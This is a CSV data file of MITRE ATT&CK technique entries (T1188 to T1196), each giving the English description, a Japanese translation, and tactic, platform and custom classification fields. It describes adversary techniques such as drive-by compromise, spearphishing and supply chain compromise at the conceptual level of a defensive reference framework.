T1188,,Multi-hop Proxy,マルチホッププロキシ,"To disguise the source of malicious traffic, adversaries may chain together multiple proxies. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source.",悪意のあるトラフィックの送信元を偽装するため、攻撃者は複数のプロキシを連鎖させる場合があります。通常、防御側は自ネットワークに入る直前の最終プロキシトラフィックを特定できますが、最終ホッププロキシ以前のプロキシを特定できるかどうかは状況によります。この手法により、防御側は悪意のあるトラフィックの送信元を特定するために複数のプロキシを経由して追跡する必要が生じ、送信元の特定がさらに困難になります。,command-and-control,Linux;macOS;Windows,other,remote_control,network_connectivity,specified,Business Workstation;Proxy / Gateway;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--7d751199-05fa-4a72-920f-85df4506c76c,2018-01-16T16:13:52.465Z,2025-04-25T15:15:47.381Z,,,,
T1189,,Drive-by Compromise,ドライブバイ攻撃,"Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. Multiple ways of delivering exploit code to a browser exist (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004)), including: * A legitimate website is compromised, allowing adversaries to inject malicious code * Script files served to a legitimate website from a publicly writeable cloud storage bucket are modified by an adversary * Malicious ads are paid for and served through legitimate ad providers (i.e., [Malvertising](https://attack.mitre.org/techniques/T1583/008)) * Built-in web application interfaces that allow user-controllable content are leveraged for the insertion of malicious scripts or iFrames (e.g., cross-site scripting) Browser push notifications may also be abused by adversaries and leveraged for malicious code injection via [User Execution](https://attack.mitre.org/techniques/T1204). By clicking ""allow"" on browser push notifications, users may be granting a website permission to run JavaScript code on their browser.(Citation: Push notifications - viruspositive)(Citation: push notification -mcafee)(Citation: push notifications - malwarebytes) Often the website used by an adversary is one visited by a specific community, such as government, a particular industry, or a particular region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is often referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.(Citation: Shadowserver Strategic Web Compromise) Typical drive-by compromise process: 1. A user visits a website that is used to host the adversary controlled content. 2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. The user may be required to assist in this process by enabling scripting, notifications, or active website components and ignoring warning dialog boxes. 3. Upon finding a vulnerable version, exploit code is delivered to the browser. 4. If exploitation is successful, the adversary will gain code execution on the user's system unless other protections are in place. In some cases, a second visit to the website after the initial scan is required before exploit code is delivered. Unlike [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.",攻撃者は、ユーザーが通常のブラウジング中にウェブサイトを訪問する過程でシステムへのアクセス権を取得する可能性がある。ブラウザにエクスプロイトコードを配信する方法は複数存在する（例：[Drive-by Target](https://attack.mitre.org/techniques/T1608/004)）。これには以下が含まれる：* 正当なウェブサイトが侵害され、攻撃者が悪意のあるコードを注入可能になる* 公開書き込み可能なクラウドストレージバケットから正当なウェブサイトに配信されるスクリプトファイルが攻撃者によって改変される* 悪意のある広告が正当な広告プロバイダーを通じて有料配信される（例：[マルバタイジング](https://attack.mitre.org/techniques/T1583/008)） * ユーザー制御可能なコンテンツを許可する組み込みWebアプリケーションインターフェースが、悪意のあるスクリプトやiFrameの挿入に悪用される（例：クロスサイトスクリプティング）ブラウザプッシュ通知も攻撃者に悪用され、[ユーザー実行](https://attack.mitre.org/techniques/T1204)を介した悪意のあるコード注入に利用される可能性があります。 ブラウザプッシュ通知で「許可」をクリックすると、ユーザーはウェブサイトに自身のブラウザ上でJavaScriptコードを実行する権限を与えている可能性がある。（引用元：Push notifications - viruspositive）（引用元：push notification -mcafee）（引用元：push notifications - malwarebytes）多くの場合、攻撃者が利用するウェブサイトは、政府、特定の業界、特定の地域など、特定のコミュニティが訪問するものであり、共通の関心に基づいて特定のユーザーまたはユーザーグループを侵害することが目的です。 この種の標的型キャンペーンは、戦略的ウェブ侵害（戦略的ウェブ侵害）またはウォーターホール攻撃と呼ばれることが多い。これまでに発生した事例はいくつか知られている。(引用: Shadowserver Strategic Web Compromise) 典型的なドライブバイ侵害のプロセス: 1. ユーザーが、攻撃者が制御するコンテンツをホストするために使用されているウェブサイトを訪問する。 2. スクリプトが自動的に実行され、通常はブラウザやプラグインのバージョンをスキャンして、脆弱性のある可能性のあるバージョンを探す。 ユーザーはスクリプトの実行許可、通知の有効化、アクティブなウェブサイトコンポーネントの許可、警告ダイアログの無視など、このプロセスへの協力を求められる場合があります。3. 脆弱なバージョンが見つかった場合、エクスプロイトコードがブラウザに配信されます。4. エクスプロイトが成功すると、他の保護策がなければ攻撃者はユーザーのシステム上でコード実行権限を獲得します。初期スキャン後にエクスプロイトコードを配信するために、ウェブサイトへの再訪問が必要なケースもあります。 [公開アプリケーションの悪用](https://attack.mitre.org/techniques/T1190)とは異なり、この手法の焦点はウェブサイト訪問時にクライアント端末上のソフトウェアを悪用することにあります。これにより攻撃者は、DMZ内の外部システムではなく、内部ネットワーク上のシステムへのアクセス権を一般的に得ることになります。,initial-access,Windows;Linux;macOS;Identity Provider,script_command_execution,entry,mfa_in_use;user_interaction;endpoint_execution;network_connectivity;cloud_control_plane;file_storage_access;logging_monitoring,specified,Business Workstation;File Server;Log / Monitoring Server;Server (On-Prem/VM),has_created_ts;has_modified_ts,S1,S1,C01,Initial Access,C01,Initial Access,TA0001,attack-pattern--d742a578-d70e-4d0e-96a6-02a9c30204e6,2018-04-18T17:59:24.739Z,2025-04-15T19:59:12.900Z,,,,
T1190,,Exploit Public-Facing Application,公開アプリケーションの悪用,"Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration. Exploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet-accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) On ESXi infrastructure, adversaries may exploit exposed OpenSLP services; they may alternatively exploit exposed VMware vCenter servers.(Citation: Recorded Future ESXiArgs Ransomware 2023)(Citation: Ars Technica VMWare Code Execution Vulnerability 2021) Depending on the flaw being exploited, this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203). If an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs (e.g., via the [Cloud Instance Metadata API](https://attack.mitre.org/techniques/T1552/005)), exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies. Adversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar) For websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",攻撃者は、ネットワークへの初期アクセスを得るため、インターネットに公開されているホストやシステムの脆弱性を悪用しようとする可能性があります。システムの脆弱性には、ソフトウェアのバグ、一時的な不具合、設定ミスなどが含まれます。 悪用されるアプリケーションはウェブサイト/ウェブサーバーが多いが、データベース（SQLなど）、標準サービス（SMBやSSHなど）、ネットワーク機器管理プロトコル（SNMPやSmart Installなど）、インターネットからアクセス可能なオープンソケットを持つその他のシステムも対象となり得る。(引用: NVD CVE-2016-6662)(引用: CIS Multiple SMB Vulnerabilities)(引用: US-CERT TA18-106A Network Infrastructure Devices 2018)(引用: Cisco Blog Legacy Device Attacks)(引用: NVD CVE-2014-7169) ESXiインフラでは、攻撃者は公開されたOpenSLPサービスを悪用する可能性があります。あるいは、公開されたVMware vCenterサーバーを悪用するケースもあります。(引用: Recorded Future ESXiArgs Ransomware 2023)(引用元: Ars Technica VMWare Code Execution Vulnerability 2021) 悪用される欠陥によっては、[防御回避のための悪用](https://attack.mitre.org/techniques/T1211) または [クライアント実行のための悪用](https://attack.mitre.org/techniques/T1203) も含まれる可能性がある。 アプリケーションがクラウドベースのインフラストラクチャ上でホストされている場合やコンテナ化されている場合、その悪用は基盤となるインスタンスやコンテナの侵害につながる可能性があります。これにより、攻撃者はクラウドやコンテナのAPI（例：[Cloud Instance Metadata API](https://attack.mitre.org/techniques/T1552/005)経由）へのアクセス経路を得たり、 [Escape to Host](https://attack.mitre.org/techniques/T1611)を介したコンテナホストへのアクセスを悪用したり、脆弱なIDおよびアクセス管理ポリシーを利用したりする可能性があります。 攻撃者はエッジネットワークインフラストラクチャや関連アプライアンスも悪用し、特に堅牢なホストベース防御をサポートしないデバイスを標的とする可能性がある。（引用元: Mandiant Fortinet Zero Day）（引用元: Wired Russia Cyberwar）ウェブサイトやデータベースに関しては、OWASPトップ10とCWEトップ25が最も一般的なウェブベースの脆弱性を示している。（引用元: OWASP Top 10）（引用元: CWE top 25）,initial-access,Containers;IaaS;Linux;Network Devices;Windows;macOS;ESXi,remote_service_abuse,entry,endpoint_execution;network_connectivity;cloud_control_plane;database_access;logging_monitoring,specified,Business Workstation;File Server;Log / Monitoring Server;Network Device (FW/Proxy/AP);Server (On-Prem/VM),has_created_ts;has_modified_ts,S1,S1,C01,Initial Access,C01,Initial Access,TA0001,attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c,2018-04-18T17:59:24.739Z,2025-04-15T19:58:25.266Z,,,,
T1191,,CMSTP,CMSTP,"The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. (Citation: Microsoft Connection Manager Oct 2009) CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections. Adversaries may supply CMSTP.exe with INF files infected with malicious commands. (Citation: Twitter CMSTP Usage Jan 2018) Similar to [Regsvr32](https://attack.mitre.org/techniques/T1117) / ”Squiblydoo E CMSTP.exe may be abused to load and execute DLLs (Citation: MSitPros CMSTP Aug 2017) and/or COM scriptlets (SCT) from remote servers. (Citation: Twitter CMSTP Jan 2018) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018) This execution may also bypass AppLocker and other whitelisting defenses since CMSTP.exe is a legitimate, signed Microsoft application. CMSTP.exe can also be abused to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088) and execute arbitrary commands from a malicious INF through an auto-elevated COM interface. (Citation: MSitPros CMSTP Aug 2017) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018)",Microsoft Connection Manager Profile Installer（CMSTP.exe）は、Connection Managerサービスプロファイルをインストールするためのコマンドラインプログラムである。（引用元：Microsoft Connection Manager Oct 2009）CMSTP.exeはインストール情報ファイル（INF）をパラメータとして受け取り、リモートアクセス接続に活用されるサービスプロファイルをインストールする。 攻撃者は、悪意のあるコマンドに感染した INF ファイルを CMSTP.exe に供給する可能性があります。(引用: Twitter CMSTP Usage Jan 2018) [Regsvr32](https://attack.mitre.org/techniques/T1117) / ”Squiblydoo E CMSTP.exe と同様に、悪用されて DLL （引用元：MSitPros CMSTP 2017年8月）および/またはリモートサーバーからのCOMスクリプトレット（SCT）をロード・実行するために悪用される可能性があります。（引用元：Twitter CMSTP 2018年1月）（引用元：GitHub Ultimate AppLocker Bypass List）（引用元：Endurant CMSTP 2018年7月） この実行は、CMSTP.exeが正当な署名付きMicrosoftアプリケーションであるため、AppLockerやその他のホワイトリスト防御も回避する可能性があります。CMSTP.exeはまた、[ユーザーアカウント制御の回避](https://attack.mitre.org/techniques/T1088)に悪用され、自動昇格されたCOMインターフェースを介して悪意のあるINFから任意のコマンドを実行することも可能です。 (引用元: MSitPros CMSTP 2017年8月) (引用元: GitHub Ultimate AppLocker Bypass List) (引用元: Endurant CMSTP 2018年7月),defense-evasion;execution,Windows,script_command_execution,stealth,privileged_account;user_interaction;endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0005;TA0002,attack-pattern--7d6f590f-544b-45b4-9a42-e0805f342af3,2018-04-18T17:59:24.739Z,2025-04-25T15:15:47.218Z,,,,
T1192,,Spearphishing Link,スピアフィッシングリンク,"Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, in order to gain access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth 2017)",リンク付きスピアフィッシングは、スピアフィッシングの特定の亜種である。他の形態との違いは、メールに悪意のあるファイルを添付する代わりに、メール内に含まれるマルウェアをダウンロードするためのリンクを使用することにある。これにより、メール添付ファイルを検査する防御策を回避できる。 あらゆる形態のスピアフィッシングは、特定の個人・企業・業界を標的とした電子的なソーシャルエンジニアリング攻撃である。この場合、悪意のあるメールにはリンクが含まれる。通常、リンクにはソーシャルエンジニアリング文言が添えられ、ユーザーが積極的にクリックするかURLをブラウザにコピー＆ペーストするよう要求される。これは[ユーザー実行](https://attack.mitre.org/techniques/T1204)を悪用する手法である。 訪問されたウェブサイトはエクスプロイトを用いてウェブブラウザを侵害する可能性があり、あるいはメールの口実に応じて、ユーザーはアプリケーション、文書、zipファイル、さらには実行ファイルのダウンロードを促される場合があります。攻撃者はまた、メールリーダーと直接やり取りすることを意図したリンクを含めることもあり、これにはエンドシステムを直接悪用したりメール受信を確認したりする埋め込み画像（ウェブバグ/ウェブビーコン）が含まれます。 リンクはまた、OAuthトークンなどの[アプリケーションアクセストークン](https://attack.mitre.org/techniques/T1528)を窃取し、保護されたアプリケーションや情報へのアクセスを得るために設計された悪意のあるアプリケーションへユーザーを誘導することもある。（引用元：Trend Micro Pawn Storm OAuth 2017）,initial-access,Windows;macOS;Linux;Office 365;SaaS,credential_abuse,entry,authentication_system;identity_federation;user_interaction;endpoint_execution;email_infrastructure;file_storage_access,specified,Business Workstation;Identity / SaaS (IdP/SSO);Mail / Collaboration;Management Console for GovCloud;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S1,S1,C01,Initial Access,C01,Initial Access,TA0001,attack-pattern--20138b9d-1aac-4a26-8654-a36b6bbf2bba,2018-04-18T17:59:24.739Z,2025-04-25T15:15:15.281Z,,,,
T1193,,Spearphishing Attachment,スピアフィッシング添付ファイル,"Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution. There are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.",スピアフィッシング添付ファイルは、スピアフィッシングの特定の亜種です。メールに添付されたマルウェアを利用するという点で、他の形態のスピアフィッシングとは異なります。 あらゆる形態のスピアフィッシングは、特定の個人、企業、業界を標的とした電子的なソーシャルエンジニアリング攻撃である。このシナリオでは、攻撃者はスピアフィッシングメールにファイルを添付し、通常は[ユーザーによる実行](https://attack.mitre.org/techniques/T1204)に依存して実行権限を獲得する。 添付ファイルにはMicrosoft Office文書、実行可能ファイル、PDF、アーカイブファイルなど多様な選択肢があります。添付ファイルを開く（場合によっては保護機能を回避してクリックする）と、攻撃者のペイロードが脆弱性を悪用するか、ユーザーのシステム上で直接実行されます。スピアフィッシングメールの本文は通常、ファイルを開くべき妥当な理由を示し、システム保護を迂回する方法を説明することがあります。 メールには、メール境界防御を回避するため、zipファイルのパスワードなど添付ファイルの復号手順が記載されている場合もある。攻撃者は頻繁にファイル拡張子やアイコンを改変し、添付された実行ファイルを文書ファイルに見せかけたり、あるアプリケーションを悪用するファイルを別のアプリケーション用ファイルに見せかけたりする。,initial-access,Windows;macOS;Linux,credential_abuse,entry,authentication_system;user_interaction;endpoint_execution;email_infrastructure;file_storage_access,specified,Business Workstation;Mail / Collaboration;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S1,S1,C01,Initial Access,C01,Initial Access,TA0001,attack-pattern--6aac77c4-eaf2-4366-8c13-ce50ab951f38,2018-04-18T17:59:24.739Z,2025-04-25T15:15:40.954Z,,,,
T1194,,Spearphishing via Service,サービス経由のスピアフィッシング,"Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services. A common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.",サービス経由のスピアフィッシングは、スピアフィッシングの特定の亜種である。企業メールチャネルを直接利用するのではなく、サードパーティサービスを利用する点で他の形態と異なる。 あらゆる形態のスピアフィッシングは、特定の個人・企業・業界を標的とした電子的なソーシャルエンジニアリング攻撃である。このシナリオでは、攻撃者は各種ソーシャルメディアサービス、個人用ウェブメール、その他企業管理外のサービスを通じてメッセージを送信する。これらのサービスは企業よりもセキュリティポリシーが緩い傾向にある。大半のスピアフィッシングと同様、目的は標的との信頼関係を構築するか、何らかの形で標的の関心を引くことである。 攻撃者は偽のソーシャルメディアアカウントを作成し、従業員に潜在的な就職機会についてメッセージを送ります。これにより、環境内で稼働しているサービス、ポリシー、ソフトウェアについて尋ねる妥当な理由が生まれます。攻撃者はその後、これらのサービスを通じて悪意のあるリンクや添付ファイルを送信できます。 典型的な手法として、ソーシャルメディアで標的との信頼関係を構築した後、標的が業務用PCで使用する個人用ウェブメールサービスにコンテンツを送信する例が挙げられる。これにより攻撃者は業務用アカウントのメール制限を回避でき、標的は期待していた内容であるためファイルを開く可能性が高まる。ペイロードが想定通りに動作しない場合、攻撃者は通常のやり取りを継続し、動作させる方法について標的とトラブルシューティングを行うことができる。,initial-access,Windows;macOS;Linux,config_policy_manipulation,entry,user_interaction;email_infrastructure;cloud_control_plane;file_storage_access,specified,Business Workstation;Mail / Collaboration;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S1,S1,C01,Initial Access,C01,Initial Access,TA0001,attack-pattern--d3df754e-997b-4cf9-97d4-70feb3120847,2018-04-18T17:59:24.739Z,2025-04-25T15:16:13.450Z,,,,
T1195,,Supply Chain Compromise,サプライチェーン侵害,"Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise can take place at any stage of the supply chain including: * Manipulation of development tools * Manipulation of a development environment * Manipulation of source code repositories (public or private) * Manipulation of source code in open-source dependencies * Manipulation of software update/distribution mechanisms * Compromised/infected system images (multiple cases of removable media infected at the factory)(Citation: IBM Storwize)(Citation: Schneider Electric USB Malware) * Replacement of legitimate software with modified versions * Sales of modified/counterfeit products to legitimate distributors * Shipment interdiction While supply chain compromise can impact any component of hardware or software, adversaries looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels.(Citation: Avast CCleaner3 2018)(Citation: Microsoft Dofoil 2018)(Citation: Command Five SK 2011) Targeting may be specific to a desired victim set or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Symantec Elderwood Sept 2012)(Citation: Avast CCleaner3 2018)(Citation: Command Five SK 2011) Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)",攻撃者は、データやシステム侵害を目的として、最終消費者が受け取る前に製品や製品配送メカニズムを操作することがある。 サプライチェーン侵害は、サプライチェーンのあらゆる段階で発生し得る：* 開発ツールの改ざん* 開発環境の改ざん* ソースコードリポジトリ（公開/非公開）の改ざん* オープンソース依存関係におけるソースコードの改ざん* ソフトウェア更新/配布メカニズムの改ざん* 侵害/感染したシステムイメージ（工場出荷時に感染したリムーバブルメディアの複数事例）（出典：IBM Storwize）(出典: Schneider Electric USB Malware) * 正規ソフトウェアの改変版への置換 * 改変/偽造製品を正規販売代理店への販売 * 輸送中の差し押さえ サプライチェーン侵害はハードウェア/ソフトウェアのあらゆる構成要素に影響を与え得るが、実行権限獲得を目指す攻撃者は、ソフトウェア配布チャネルや更新チャネルにおける正規ソフトウェアへの悪意ある追加に焦点を当てることが多い。(引用元: Avast CCleaner3 2018)(引用元: Microsoft Dofoil 2018)(引用元: Command Five SK 2011) 標的は特定の被害者グループに限定される場合もあれば、悪意のあるソフトウェアが広範な消費者層に配布され、特定の被害者に対してのみ追加の戦術に移行する場合もある。(引用: Symantec Elderwood 2012年9月)(引用: Avast CCleaner3 2018)(引用: Command Five SK 2011) 多くのアプリケーションで依存関係として使用される人気のあるオープンソースプロジェクトも、依存関係の利用者に悪意のあるコードを追加する手段として標的とされる可能性がある。(引用: Trendmicro NPM Compromise),initial-access,Linux;Windows;macOS,script_command_execution,entry,user_interaction;endpoint_execution,specified,Business Workstation;Server (On-Prem/VM),has_created_ts;has_modified_ts,S1,S1,C01,Initial Access,C01,Initial Access,TA0001,attack-pattern--3f18edba-28f4-4bb9-82c3-8aa60dcac5f7,2018-04-18T17:59:24.739Z,2025-04-15T23:13:41.905Z,,,,
T1195.001,T1195,Compromise Software Dependencies and Development Tools,ソフトウェア依存関係および開発ツールの侵害,Adversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise) Targeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.,攻撃者は、データやシステムを侵害する目的で、最終消費者が受け取る前にソフトウェア依存関係や開発ツールを操作する可能性があります。 アプリケーションは正常に機能するために外部ソフトウェアに依存することが多い。多くのアプリケーションで依存関係として使用される人気のあるオープンソースプロジェクトは、依存関係の利用者に悪意のあるコードを追加する手段として標的とされる可能性がある。(引用: Trendmicro NPM Compromise) 標的化は特定の被害者グループに限定される場合もあれば、広範な消費者層に分散されるが、特定の被害者に対してのみ追加戦術に移行する場合もある。,initial-access,Linux;macOS;Windows,other,entry,user_interaction,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S1,S1,C01,Initial Access,C01,Initial Access,TA0001,attack-pattern--191cc6af-1bb2-4344-ab5f-28e496638720,2020-03-11T14:13:42.916Z,2025-04-15T22:08:13.223Z,,,,
T1195.002,T1195,Compromise Software Supply Chain,ソフトウェア供給網の侵害,"Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version. Targeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Avast CCleaner3 2018)(Citation: Command Five SK 2011)",攻撃者は、データやシステムの侵害を目的として、最終消費者が受け取る前にアプリケーションソフトウェアを改ざんする可能性があります。ソフトウェアのサプライチェーン侵害は、アプリケーションソースコードの改ざん、そのソフトウェアの更新/配布メカニズムの改ざん、コンパイル済みリリースを改変版で置き換えるなど、様々な方法で発生します。 標的は特定の被害者グループに限定される場合もあれば、広範な消費者層に配布されるが、追加戦術は特定の被害者に対してのみ実行される場合もある。（引用元：Avast CCleaner3 2018）（引用元：Command Five SK 2011）,initial-access,Linux;macOS;Windows,script_command_execution,entry,endpoint_execution,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S1,S1,C01,Initial Access,C01,Initial Access,TA0001,attack-pattern--bd369cd9-abb8-41ce-b5bb-fff23ee86c00,2020-03-11T14:17:21.153Z,2025-04-15T22:08:31.739Z,,,,
T1195.003,T1195,Compromise Hardware Supply Chain,ハードウェア供給網の侵害,"Adversaries may manipulate hardware components in products prior to receipt by a final consumer for the purpose of data or system compromise. By modifying hardware or firmware in the supply chain, adversaries can insert a backdoor into consumer networks that may be difficult to detect and give the adversary a high degree of control over the system. Hardware backdoors may be inserted into various devices, such as servers, workstations, network infrastructure, or peripherals.",敵対者は、データやシステムの侵害を目的として、最終消費者が受け取る前に製品内のハードウェアコンポーネントを操作する可能性がある。サプライチェーンにおけるハードウェアやファームウェアの改変により、敵対者は検出が困難なバックドアを消費者ネットワークに挿入し、システムに対する高度な制御権を獲得できる。ハードウェアバックドアは、サーバー、ワークステーション、ネットワークインフラ、周辺機器など様々なデバイスに挿入される可能性がある。,initial-access,Linux;macOS;Windows,other,entry,network_connectivity,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S1,S1,C01,Initial Access,C01,Initial Access,TA0001,attack-pattern--39131305-9282-45e4-ac3b-591d2d4fc3ef,2020-03-11T14:28:40.064Z,2025-04-15T22:07:50.636Z,,,,
T1196,,Control Panel Items,コントロールパネル項目,"Windows Control Panel items are utilities that allow users to view and adjust computer settings. Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a CPlApplet function. (Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL Malware Jan 2014) Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file. (Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL Malware Jan 2014) (Citation: TrendMicro CPL Malware Dec 2013) For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel. (Citation: Microsoft Implementing CPL) Adversaries can use Control Panel items as execution payloads to execute arbitrary commands. Malicious Control Panel items can be delivered via [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) campaigns (Citation: TrendMicro CPL Malware Jan 2014) (Citation: TrendMicro CPL Malware Dec 2013) or executed as part of multi-stage malware. (Citation: Palo Alto Reaver Nov 2017) Control Panel items, specifically CPL files, may also bypass application and/or file extension whitelisting.",Windowsコントロールパネル項目は、ユーザーがコンピュータの設定を表示・調整するためのユーティリティである。コントロールパネル項目は、登録された実行可能ファイル（.exe）またはコントロールパネルファイル（.cpl）であり、後者は実際にはCPlApplet関数をエクスポートするダイナミックリンクライブラリ（.dll）ファイルの名前を変更したものである。（引用元：Microsoft Implementing CPL） (引用元: TrendMicro CPL Malware Jan 2014) コントロールパネル項目は、コマンドラインからの直接実行、アプリケーションプログラミングインターフェース(API)呼び出しによるプログラム実行、またはファイルのダブルクリックによって実行可能です。(引用元: Microsoft Implementing CPL) (引用元: TrendMicro CPL Malware Jan 2014) (引用元: TrendMicro CPL Malware Dec 2013) 利便性のため、コントロールパネル項目には通常、登録・読み込み後にユーザーが利用可能なグラフィカルメニューが含まれる。（引用元：Microsoft Implementing CPL）攻撃者は任意のコマンドを実行する実行ペイロードとしてコントロールパネル項目を利用可能。悪意のあるコントロールパネル項目は[標的型フィッシング添付ファイル](https://attack.mitre.org/techniques/T1193)キャンペーンで配布される （引用元：TrendMicro CPLマルウェア 2014年1月） （引用元：TrendMicro CPLマルウェア 2013年12月） あるいは多段階マルウェアの一部として実行される。（引用元：Palo Alto Reaver 2017年11月） コントロールパネル項目、特にCPLファイルは、アプリケーションおよび/またはファイル拡張子のホワイトリストも回避する可能性がある。,defense-evasion;execution,Windows,script_command_execution,stealth,user_interaction;endpoint_execution;cloud_control_plane;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0005;TA0002,attack-pattern--8df54627-376c-487c-a09c-7d2b5620f56e,2018-04-18T17:59:24.739Z,2025-04-25T15:15:51.719Z,,,,
